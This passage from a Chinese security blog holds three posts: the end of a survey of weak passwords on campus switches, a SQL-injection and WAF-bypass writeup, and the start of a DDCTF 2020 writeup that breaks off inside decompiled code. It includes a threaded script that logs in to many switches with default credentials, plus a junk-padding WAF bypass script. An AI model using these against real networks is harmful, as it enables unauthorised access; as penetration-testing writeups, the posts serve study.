class="hljs-string">r&quot;C:\Users\shinelon\Desktop\tmp\switch_vuln_total.txt&quot;</span>,encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    urls= f.read().splitlines()<br><br>q = Queue(maxsize=<span class="hljs-number">0</span>)<br><span class="hljs-keyword">for</span> each <span class="hljs-keyword">in</span> urls:<br>    q.put(each)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">try_vuln</span>(<span class="hljs-params">browser</span>):<br>    <span class="hljs-keyword">global</span> fiber_count<br>    <span class="hljs-keyword">global</span> port_count<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">if</span> q.empty():<br>            <span class="hljs-keyword">break</span><br>        url = q.get()<br>        <span class="hljs-keyword">try</span>:<br>            browser.get(url)<span class="hljs-comment">#打开浏览器预设网址</span><br>            time.sleep(<span class="hljs-number">2</span>)<br>            result = alert_is_present()(browser)<br>            <span class="hljs-keyword">if</span> result:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;found tanchuang and click!&quot;</span>)<br>                result.accept()<br><br>            locator = (By.ID, <span class="hljs-string">&#x27;UserName&#x27;</span>)<br>            WebDriverWait(browser, <span class="hljs-number">30</span>, <span class="hljs-number">1</span>).until(EC.presence_of_element_located(locator))<br>            locator = (By.ID, <span class="hljs-string">&#x27;userPassword&#x27;</span>)<br>            WebDriverWait(browser, <span class="hljs-number">30</span>, <span class="hljs-number">1</span>).until(EC.presence_of_element_located(locator))<br>            locator = (By.ID, <span class="hljs-string">&#x27;goBtn&#x27;</span>)<br>            WebDriverWait(browser, <span class="hljs-number">30</span>, <span class="hljs-number">1</span>).until(EC.presence_of_element_located(locator))<br><br>            browser.find_element_by_id(<span class="hljs-string">&quot;UserName&quot;</span>).send_keys(<span class="hljs-string">&quot;admin&quot;</span>)<br>            time.sleep(<span class="hljs-number">0.5</span>)<br>            <span class="hljs-comment"># 输入密码</span><br>            browser.find_element_by_id(<span class="hljs-string">&quot;userPassword&quot;</span>).send_keys(<span class="hljs-string">&quot;admin@123&quot;</span>)<br>            time.sleep(<span class="hljs-number">0.5</span>)<br>            browser.find_element_by_id(<span class="hljs-string">&quot;goBtn&quot;</span>).click()<br>            time.sleep(<span class="hljs-number">15</span>)<br>            data = browser.page_source<br>            html = etree.HTML(data)<br>            html_data = html.xpath(<span class="hljs-string">&#x27;//table[@class=&quot;portPanelTable&quot;]//img/@src&#x27;</span>)<br>            <span class="hljs-keyword">for</span> each <span class="hljs-keyword">in</span> html_data:<br>                count1 = each.find(<span class="hljs-string">&quot;fiber_green&quot;</span>)<br>                count2 = each.find(<span class="hljs-string">&quot;port_green&quot;</span>)<br>                <span class="hljs-keyword">if</span> count1!=-<span class="hljs-number">1</span>:<br>                    fiber_count +=<span class="hljs-number">1</span><br>                <span class="hljs-keyword">if</span> count2!=-<span class="hljs-number">1</span>:<br>                    port_count +=<span class="hljs-number">1</span><br><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;The current affected port is &quot;</span> + <span class="hljs-built_in">str</span>(port_count))<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;The current affected fiber is &quot;</span> + <span class="hljs-built_in">str</span>(fiber_count))<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan_all</span>():<br>    <span class="hljs-keyword">for</span> index <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        browser=webdriver.Chrome(options=options)<br>        th = threading.Thread(target=try_vuln,args=(browser,))<br>        th.start()<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">alert_is_present</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-string">&quot;&quot;&quot; Expect an alert to be present.&quot;&quot;&quot;</span><br><br>    <span class="hljs-string">&quot;&quot;&quot;判断当前页面的alert弹窗&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__call__</span>(<span class="hljs-params">self, driver</span>):<br>        <span class="hljs-keyword">try</span>:<br>            alert = driver.switch_to.alert<br>            <span class="hljs-keyword">return</span> alert<br>        <span class="hljs-keyword">except</span> Exception:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    scan_all()<br></code></pre></td></tr></table></figure><p>运行结果如下：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E6%9F%90%E6%A0%A1%E5%8C%BA%E5%A4%A7%E8%8C%83%E5%9B%B4%E4%BA%A4%E6%8D%A2%E6%9C%BA%E5%BC%B1%E5%8F%A3%E4%BB%A4%E8%B0%83%E6%9F%A5%E8%AE%B0%E5%BD%95.assets/2021030114311518.png" alt="在这里插入图片描述"></p><p>可以看出受影响的主机为 4362 台，总共接入光纤有 865 条。算是一个比较严重的结果。</p><h1 id="3-后记"><a href="#3-后记" class="headerlink" title="3. 后记"></a>3. 后记</h1><p>在对数据进行统计的过程中发现有些交换机的密码被改了，应该是管理员发现登录的 IP异常并做了相应的修改口令的操作。</p><p>即上述统计出来的数据涉及到的交换机数应少于620 台。若是发现当时就进行统计结果只会更加惊人。</p><p>一开始的 1124 条交换机记录是通过大规模的内网探测抓取出来的。对大范围的内网进行探测所带来的弊端就是为了效率可能需要牺牲一些精确度。也就是存在少部分的带有弱口令的交换机没有被扫出来。</p><h1 id="4-总结"><a href="#4-总结" class="headerlink" title="4.总结"></a>4.总结</h1><p>在进行SRC挖掘和渗透测试的过程中，当挖到一个特定的漏洞时可以尝试对其进行横向拓展。往往会有意想不到的惊喜</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>实战记录</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>实战记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>某大学新版学工系统SQL注入与WAF绕过</title>
    <link href="/2020/08/04/%E5%AE%9E%E6%88%98/%E6%9F%90%E5%A4%A7%E5%AD%A6%E6%96%B0%E7%89%88%E5%AD%A6%E5%B7%A5%E7%B3%BB%E7%BB%9FSQL%E6%B3%A8%E5%85%A5%E4%B8%8EWAF%E7%BB%95%E8%BF%87/"/>
    <url>/2020/08/04/%E5%AE%9E%E6%88%98/%E6%9F%90%E5%A4%A7%E5%AD%A6%E6%96%B0%E7%89%88%E5%AD%A6%E5%B7%A5%E7%B3%BB%E7%BB%9FSQL%E6%B3%A8%E5%85%A5%E4%B8%8EWAF%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<p>声明：本文所做所有操作已得到学校官方授权，漏洞已经报送并确认修复，认出来的同学请勿将本文用于非法用途  </p><p>在挖掘校内SRC时发现核心系统之一学工系统存在SQL注入，遂有此文     </p><h1 id="前期的信息收集"><a href="#前期的信息收集" class="headerlink" title="前期的信息收集"></a>前期的信息收集</h1><p>①大学的学生工作管理系统，在校期间几乎所有学生的业务办理都会经过这个系统。是非常敏感的业务点</p><p>②系统对外网开放，需要经过学校的cas系统进行认证才能进入（但对于校内学生来说问题不大）</p><p>③该系统上了某知名安全的商业waf，在之后的渗透中很大一部分时间是在尝试着对waf进行绕过</p><h1 id="肾透"><a href="#肾透" class="headerlink" title="肾透"></a>肾透</h1><p>网站打开是这样的：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E6%9F%90%E5%A4%A7%E5%AD%A6%E6%96%B0%E7%89%88%E5%AD%A6%E5%B7%A5%E7%B3%BB%E7%BB%9FSQL%E6%B3%A8%E5%85%A5%E4%B8%8EWAF%E7%BB%95%E8%BF%87.assets/20210205220529332.png" alt="在这里插入图片描述"></p><p> 一般来说这种系统涉及到的信息比较多而敏感，交互也比较复杂，很容易出现水平越权，信息泄露之类的问题。之前也挖到过，但不是本文的重点。</p><p>为了测试效率我们使用xray配合rad对网站整体进行一些扫描</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E6%9F%90%E5%A4%A7%E5%AD%A6%E6%96%B0%E7%89%88%E5%AD%A6%E5%B7%A5%E7%B3%BB%E7%BB%9FSQL%E6%B3%A8%E5%85%A5%E4%B8%8EWAF%E7%BB%95%E8%BF%87.assets/20210205220548480.png" alt="在这里插入图片描述"></p><p>扫描完毕查看报告，可以看到几个疑似SQL注入的漏洞，但是否是假阳性需要手工进行进一步的确认。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E6%9F%90%E5%A4%A7%E5%AD%A6%E6%96%B0%E7%89%88%E5%AD%A6%E5%B7%A5%E7%B3%BB%E7%BB%9FSQL%E6%B3%A8%E5%85%A5%E4%B8%8EWAF%E7%BB%95%E8%BF%87.assets/20210205220637290.png" alt="在这里插入图片描述"></p><p>通过报错及xray提供的信息我们知道该系统使用的是Oracle数据库，且出现的可能是报错注入</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E6%9F%90%E5%A4%A7%E5%AD%A6%E6%96%B0%E7%89%88%E5%AD%A6%E5%B7%A5%E7%B3%BB%E7%BB%9FSQL%E6%B3%A8%E5%85%A5%E4%B8%8EWAF%E7%BB%95%E8%BF%87.assets/20210205220637289.png" alt="在这里插入图片描述"></p><p>这个时候自然想的是SQLMAP等自动化的脚本来帮我们取数据了，但由于有waf的存在我们需要先找到绕过waf的方式</p><p>尝试失败的截图我就不放出来了，最后我找的成功的方式是使用增加垃圾数据包的方法让waf直接放行从而绕过。</p><p>参考的主要是这个师傅的文章</p><p> <a href="https://xz.aliyun.com/t/7578?page=34">https://xz.aliyun.com/t/7578?page=34</a> </p><p>按照师傅的方法，我们需要生成一些垃圾数据，这里直接照搬脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><br>ls = [<span class="hljs-built_in">chr</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">33</span>,<span class="hljs-number">125</span>)]<br>ls.remove(<span class="hljs-string">&quot;#&quot;</span>) <span class="hljs-comment"># 防止url被注释</span><br>ls.remove(<span class="hljs-string">&quot;*&quot;</span>) <span class="hljs-comment"># 方便使用sqlmap报数据</span><br>s = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000</span>):<br>    s = s+random.choice(ls)<br><span class="hljs-built_in">print</span>(s)<br></code></pre></td></tr></table></figure><p>生成效果如下：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E6%9F%90%E5%A4%A7%E5%AD%A6%E6%96%B0%E7%89%88%E5%AD%A6%E5%B7%A5%E7%B3%BB%E7%BB%9FSQL%E6%B3%A8%E5%85%A5%E4%B8%8EWAF%E7%BB%95%E8%BF%87.assets/20210205220637448.png" alt="在这里插入图片描述"></p><p>填充垃圾数据前后响应对比：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E6%9F%90%E5%A4%A7%E5%AD%A6%E6%96%B0%E7%89%88%E5%AD%A6%E5%B7%A5%E7%B3%BB%E7%BB%9FSQL%E6%B3%A8%E5%85%A5%E4%B8%8EWAF%E7%BB%95%E8%BF%87.assets/2021020522345128.png" alt="在这里插入图片描述"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E6%9F%90%E5%A4%A7%E5%AD%A6%E6%96%B0%E7%89%88%E5%AD%A6%E5%B7%A5%E7%B3%BB%E7%BB%9FSQL%E6%B3%A8%E5%85%A5%E4%B8%8EWAF%E7%BB%95%E8%BF%87.assets/2021020522351296.png" alt="在这里插入图片描述"></p><p>waf绕过之后我们就能进行利用了，将抓到的包放进sqlmap中跑即可，记得用*号设置注入点。</p><p>SQLMAP能成功探测出一样的注入</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E6%9F%90%E5%A4%A7%E5%AD%A6%E6%96%B0%E7%89%88%E5%AD%A6%E5%B7%A5%E7%B3%BB%E7%BB%9FSQL%E6%B3%A8%E5%85%A5%E4%B8%8EWAF%E7%BB%95%E8%BF%87.assets/20210205220638296.png" alt="在这里插入图片描述"></p><p>但在利用时除了些许的问题，SQLMAP取不回数据：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E6%9F%90%E5%A4%A7%E5%AD%A6%E6%96%B0%E7%89%88%E5%AD%A6%E5%B7%A5%E7%B3%BB%E7%BB%9FSQL%E6%B3%A8%E5%85%A5%E4%B8%8EWAF%E7%BB%95%E8%BF%87.assets/20210205220638470.png" alt="在这里插入图片描述"></p><p>开启 -v 并将等级调到最高，看返回的结果。最终发现网站会自动对传入的括号用单引号括起来：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E6%9F%90%E5%A4%A7%E5%AD%A6%E6%96%B0%E7%89%88%E5%AD%A6%E5%B7%A5%E7%B3%BB%E7%BB%9FSQL%E6%B3%A8%E5%85%A5%E4%B8%8EWAF%E7%BB%95%E8%BF%87.assets/20210205223559400.png" alt="在这里插入图片描述"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E6%9F%90%E5%A4%A7%E5%AD%A6%E6%96%B0%E7%89%88%E5%AD%A6%E5%B7%A5%E7%B3%BB%E7%BB%9FSQL%E6%B3%A8%E5%85%A5%E4%B8%8EWAF%E7%BB%95%E8%BF%87.assets/20210205220638826.png" alt="在这里插入图片描述"></p><p>这样其实相当于逗号不能用了。不过问题不大，通过一些等价的表述我们依旧能够拿到数据，而且对于SRC的挖掘而言我们的目的已经达到了。</p><p>我们可以看一哈系统中有哪些表，简单验证一下这个漏洞：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E6%9F%90%E5%A4%A7%E5%AD%A6%E6%96%B0%E7%89%88%E5%AD%A6%E5%B7%A5%E7%B3%BB%E7%BB%9FSQL%E6%B3%A8%E5%85%A5%E4%B8%8EWAF%E7%BB%95%E8%BF%87.assets/20210216003053659.png" alt="在这里插入图片描述"></p><p>以及最后的一个为了自动化拿数据写的脚本（敏感信息就不放源码了）：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E6%9F%90%E5%A4%A7%E5%AD%A6%E6%96%B0%E7%89%88%E5%AD%A6%E5%B7%A5%E7%B3%BB%E7%BB%9FSQL%E6%B3%A8%E5%85%A5%E4%B8%8EWAF%E7%BB%95%E8%BF%87.assets/202102052206408.png" alt="在这里插入图片描述"><br><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E6%9F%90%E5%A4%A7%E5%AD%A6%E6%96%B0%E7%89%88%E5%AD%A6%E5%B7%A5%E7%B3%BB%E7%BB%9FSQL%E6%B3%A8%E5%85%A5%E4%B8%8EWAF%E7%BB%95%E8%BF%87.assets/20210205220640444.png" alt="在这里插入图片描述"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>①存储大量信息且频繁和用户进行交互的系统是非常容易出问题的点，是SRC挖掘需要重点关注的对象</p><p>②Bypass waf是非常考验技术和耐心的一个点，这次是运气好成功绕过，以后还要加深学习</p><p>③即使绕过了waf由于网站本身的复杂性，自动化的工具可能需要自行改造或者重新编写，一个好的编程能力对于一个白帽子来说是不可或缺的。</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>实战记录</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>实战记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DDCTF 2020 Web WP</title>
    <link href="/2020/08/03/writeup/DDCTF%202020%20Web%20WP/"/>
    <url>/2020/08/03/writeup/DDCTF%202020%20Web%20WP/</url>
    
    <content type="html"><![CDATA[<p>Go实乃知识盲区</p><p>这是一篇复现记录，部分思路参考了如下链接，赞美师傅wywwtwx</p><p>参考：<a href="https://www.anquanke.com/post/id/216694">DDCTF 2020 Writeup - 安全客，安全资讯平台</a></p><h1 id="Web签到题"><a href="#Web签到题" class="headerlink" title="Web签到题"></a>Web签到题</h1><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/DDCTF%202020%20Web%20WP.assets/20200907132206609.png" alt="在这里插入图片描述"></p><p>前面的相信大家都懂，是JWT爆破，但还是梳理一下</p><p>根据提示在用POST传参可以拿到JWT</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/DDCTF%202020%20Web%20WP.assets/20200907133643261.png" alt="在这里插入图片描述"></p><p>在拿去爆破后可得到Secret值（似乎是你的用户名，然后群里有师傅用户名乱输然后没爆破出来。。）</p><p>爆破工具是c-jwt-cracker（需要的<a href="https://github.com/brendan-rius/c-jwt-cracker">自取</a>）</p><p>爆破拿到key后去网站<a href="https://jwt.io/">https://jwt.io</a> 篡改JWT，而后再次提交</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/DDCTF%202020%20Web%20WP.assets/20200907133538679.png" alt="在这里插入图片描述"></p><p>就可以拿到client，自此第一关结束。</p><p>第二关是需要在client中构造合法的sign值<br><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/DDCTF%202020%20Web%20WP.assets/20200907133934925.png" alt="在这里插入图片描述"></p><p>这里可以逆向算法后写脚本，也可以patch，我选的是第一个路子，这块做完后就彻底卡住了</p><p>参考：<br><a href="https://www.anquanke.com/post/id/170332">https://www.anquanke.com/post/id/170332</a><br><a href="https://www.anquanke.com/post/id/85694">https://www.anquanke.com/post/id/85694</a><br><a href="https://www.jianshu.com/p/7d006f2b4414">https://www.jianshu.com/p/7d006f2b4414</a></p><p>关于算法的逆向：</p><p>七分逆向三分猜，作为一个Web分类下的题，出题人必然不会在Re上卡我们。刚好我同时算半个Re选手，顺便记录一下当时的心路历程。</p><p>当时还不太知道有IDA的Golang插件，不过也是搞了出来。现在顺便加上，看起来也舒服些</p><p><a href="https://github.com/sibears/IDAGolangHelper">https://github.com/sibears/IDAGolangHelper</a></p><p>首先找到我们的关键getSign函数（没有插件可以用老方法String）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">main_getSign</span><span class="hljs-params">(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, __int128 a7, __int64 a8)</span><br>&#123;<br>  __int64 v8; <span class="hljs-comment">// rcx</span><br>  __int64 v9; <span class="hljs-comment">// rdx</span><br>  __int64 v10; <span class="hljs-comment">// r8</span><br>  __int64 v11; <span class="hljs-comment">// rax</span><br>  __int64 v12; <span class="hljs-comment">// rcx</span><br>  __int64 v13; <span class="hljs-comment">// rbx</span><br>  __int64 v14; <span class="hljs-comment">// rdx</span><br>  __int64 v15; <span class="hljs-comment">// r8</span><br>  __int64 v16; <span class="hljs-comment">// r9</span><br>  __int64 v17; <span class="hljs-comment">// rax</span><br>  __int64 v18; <span class="hljs-comment">// rcx</span><br>  __int64 v19; <span class="hljs-comment">// rbx</span><br>  __int64 v20; <span class="hljs-comment">// rdx</span><br>  __int64 v21; <span class="hljs-comment">// r8</span><br>  __int64 v22; <span class="hljs-comment">// r9</span><br>  __int64 v23; <span class="hljs-comment">// rdx</span><br>  __int64 v24; <span class="hljs-comment">// r8</span><br>  __int64 v25; <span class="hljs-comment">// r9</span><br>  __int64 v26; <span class="hljs-comment">// rdx</span><br>  __int64 v27; <span class="hljs-comment">// r8</span><br>  __int64 v28; <span class="hljs-comment">// r9</span><br>  __int64 v29; <span class="hljs-comment">// rdx</span><br>  __int64 v30; <span class="hljs-comment">// rdx</span><br>  __int64 v31; <span class="hljs-comment">// rcx</span><br>  __int64 v32; <span class="hljs-comment">// r8</span><br>  __int64 v33; <span class="hljs-comment">// r9</span><br>  __int64 v34; <span class="hljs-comment">// rdx</span><br>  __int64 v35; <span class="hljs-comment">// r8</span><br>  __int64 v36; <span class="hljs-comment">// rdx</span><br>  __int64 v37; <span class="hljs-comment">// r8</span><br>  __int64 v38; <span class="hljs-comment">// rax</span><br>  __int64 v39; <span class="hljs-comment">// rcx</span><br>  __int64 v40; <span class="hljs-comment">// rbx</span><br>  __int64 v41; <span class="hljs-comment">// rdx</span><br>  __int64 v42; <span class="hljs-comment">// r8</span><br>  __int64 v43; <span class="hljs-comment">// rax</span><br>  __int64 v44; <span class="hljs-comment">// rcx</span><br>  __int64 v45; <span class="hljs-comment">// rbx</span><br>  __int64 v46; <span class="hljs-comment">// rdx</span><br>  __int64 v47; <span class="hljs-comment">// r8</span><br>  __int64 v48; <span class="hljs-comment">// r9</span><br>  __int64 v49; <span class="hljs-comment">// rax</span><br>  __int64 v50; <span class="hljs-comment">// rcx</span><br>  __int64 v51; <span class="hljs-comment">// rbx</span><br>  __int64 (__fastcall **v53)(__int64, __int64); <span class="hljs-comment">// [rsp+0h] [rbp-148h]</span><br>  __int128 v54; <span class="hljs-comment">// [rsp+8h] [rbp-140h]</span><br>  __m256i v55; <span class="hljs-comment">// [rsp+18h] [rbp-130h]</span><br>  __int64 v56; <span class="hljs-comment">// [rsp+38h] [rbp-110h]</span><br>  __int128 v57; <span class="hljs-comment">// [rsp+40h] [rbp-108h]</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *v58; <span class="hljs-comment">// [rsp+50h] [rbp-F8h]</span><br>  __int64 v59; <span class="hljs-comment">// [rsp+58h] [rbp-F0h]</span><br>  __int128 v60; <span class="hljs-comment">// [rsp+60h] [rbp-E8h]</span><br>  __int64 v61; <span class="hljs-comment">// [rsp+70h] [rbp-D8h]</span><br>  __int64 v62; <span class="hljs-comment">// [rsp+78h] [rbp-D0h]</span><br>  __int128 v63; <span class="hljs-comment">// [rsp+80h] [rbp-C8h]</span><br>  __int128 v64; <span class="hljs-comment">// [rsp+90h] [rbp-B8h]</span><br>  __int128 v65; <span class="hljs-comment">// [rsp+A0h] [rbp-A8h]</span><br>  __int128 v66; <span class="hljs-comment">// [rsp+B0h] [rbp-98h]</span><br>  __int64 v67; <span class="hljs-comment">// [rsp+C0h] [rbp-88h]</span><br>  __int64 *v68; <span class="hljs-comment">// [rsp+C8h] [rbp-80h]</span><br>  __int128 v69; <span class="hljs-comment">// [rsp+D0h] [rbp-78h]</span><br>  __int128 v70; <span class="hljs-comment">// [rsp+E0h] [rbp-68h]</span><br>  __int64 v71; <span class="hljs-comment">// [rsp+F0h] [rbp-58h]</span><br>  __int64 v72; <span class="hljs-comment">// [rsp+F8h] [rbp-50h]</span><br>  __int64 v73; <span class="hljs-comment">// [rsp+100h] [rbp-48h]</span><br>  __int64 v74; <span class="hljs-comment">// [rsp+108h] [rbp-40h]</span><br>  __int64 v75; <span class="hljs-comment">// [rsp+110h] [rbp-38h]</span><br>  __int64 v76; <span class="hljs-comment">// [rsp+118h] [rbp-30h]</span><br>  __int64 v77; <span class="hljs-comment">// [rsp+120h] [rbp-28h]</span><br>  __int64 v78; <span class="hljs-comment">// [rsp+128h] [rbp-20h]</span><br>  __int64 v79; <span class="hljs-comment">// [rsp+130h] [rbp-18h]</span><br>  __int64 v80; <span class="hljs-comment">// [rsp+138h] [rbp-10h]</span><br>  __int64 v81; <span class="hljs-comment">// [rsp+140h] [rbp-8h]</span><br><br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    v8 = __readfsqword(<span class="hljs-number">0xFFFFFFF8</span>);<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int64)&amp;v63 &gt; *(_QWORD *)(v8 + <span class="hljs-number">16</span>) )<br>      <span 